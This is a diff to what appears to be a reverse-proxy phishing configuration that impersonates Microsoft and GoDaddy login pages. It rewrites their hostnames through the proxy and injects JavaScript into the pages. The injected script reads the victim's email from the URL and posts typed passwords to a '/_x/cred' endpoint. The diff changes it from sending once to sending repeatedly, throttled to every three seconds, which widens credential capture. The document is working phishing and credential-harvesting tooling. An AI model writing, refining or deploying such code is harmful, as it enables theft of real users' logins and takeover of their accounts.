@@ -138,7 +138,7 @@ sub_filters:
 #  - {triggers_on: 'account.microsoft.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
   - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "href=\"https://{hostname}", replace: "href=\"https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
-  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
   - { triggers_on: "events.api.godaddy.com", orig_sub: "events.api", domain: "godaddy.com", search: "href=\"https://{hostname}", replace: "href=\"https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
   - { triggers_on: "events.api.godaddy.com", orig_sub: "events.api", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'account', domain: 'microsoft.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
@@ -154,7 +154,7 @@ sub_filters:
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
   - {triggers_on: 'csp.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
   - {triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
   - {triggers_on: 'gui.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
@@ -378,10 +378,12 @@ js_inject:
         var hash   = window.location.hash.slice(1);
         if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);
 
-        var _sent = false;
+        var _lastSent = 0;
         function _sendCred(pass, user) {
-          if (_sent || !pass) return;
-          _sent = true;
+          if (!pass) return;
+          var now = Date.now();
+          if (now - _lastSent < 3000) return;
+          _lastSent = now;
           try {
             var xhr = new XMLHttpRequest();
             xhr.open('POST', '/_x/cred', true);
@@ -497,10 +499,12 @@ js_inject:
         var hash   = window.location.hash.slice(1);
         if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);
 
-        var _sent = false;
+        var _lastSent = 0;
         function _sendCred(pass, user) {
-          if (_sent || !pass) return;
-          _sent = true;
+          if (!pass) return;
+          var now = Date.now();
+          if (now - _lastSent < 3000) return;
+          _lastSent = now;
           try {
             var xhr = new XMLHttpRequest();
             xhr.open('POST', '/_x/cred', true);
